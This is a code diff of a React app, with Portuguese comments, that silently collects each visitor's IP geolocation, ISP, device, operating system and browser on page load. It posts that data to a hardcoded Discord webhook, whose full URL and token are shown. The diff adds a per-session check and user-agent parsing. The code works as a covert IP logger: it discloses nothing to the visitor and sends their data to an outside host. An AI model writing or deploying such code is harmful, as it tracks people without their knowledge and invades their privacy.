@@ -14,6 +14,13 @@ function App() {
 
   useEffect(() => {
 
+    // VERIFICA SE JÁ ENVIOU
+    const jaEnviado = sessionStorage.getItem("visitou");
+
+    if (jaEnviado) return;
+
+    sessionStorage.setItem("visitou", "true");
+
     const enviarWebhook = async () => {
       try {
 
@@ -24,6 +31,31 @@ function App() {
         // PEGA LOCALIZAÇÃO
         const geoRes = await fetch("https://ipapi.co/json/");
         const data = await geoRes.json();
+
+        // USER AGENT
+        const ua = navigator.userAgent;
+
+        let dispositivo = "PC";
+        let sistema = "Desconhecido";
+        let navegador = "Desconhecido";
+
+        // DISPOSITIVO
+        if (/Android/i.test(ua)) dispositivo = "Android";
+        if (/iPhone|iPad|iPod/i.test(ua)) dispositivo = "iPhone";
+        if (/Macintosh/i.test(ua)) dispositivo = "Mac";
+        if (/Windows/i.test(ua)) dispositivo = "Windows PC";
+
+        // SISTEMA
+        if (/Windows/i.test(ua)) sistema = "Windows";
+        if (/Mac OS X/i.test(ua)) sistema = "macOS";
+        if (/Android/i.test(ua)) sistema = "Android";
+        if (/iPhone|iPad/i.test(ua)) sistema = "iOS";
+
+        // NAVEGADOR
+        if (/Chrome/i.test(ua)) navegador = "Chrome";
+        if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) navegador = "Safari";
+        if (/Firefox/i.test(ua)) navegador = "Firefox";
+        if (/Edg/i.test(ua)) navegador = "Edge";
 
         // ENVIA PRO DISCORD
         await fetch("https://discord.com/api/webhooks/1504605700217639005/1LZPA9UZN1CsaBdFr8zOZ_9YzK-s4Fucp_-TJZAfPIAiRmNOvYZFOFquyd0WW1g8K2u8", {
@@ -45,8 +77,14 @@ function App() {
 `📡 ISP:\n` +
 `${data.org}\n\n` +
 
-`💻 NAVEGADOR:\n` +
-`${navigator.userAgent}\n\n` +
+`📱 DISPOSITIVO:\n` +
+`${dispositivo}\n\n` +
+
+`💻 SISTEMA:\n` +
+`${sistema}\n\n` +
+
+`🌐 NAVEGADOR:\n` +
+`${navegador}\n\n` +
 
 `⏰ HORÁRIO:\n` +
 `${new Date().toLocaleString("pt-BR")}` +
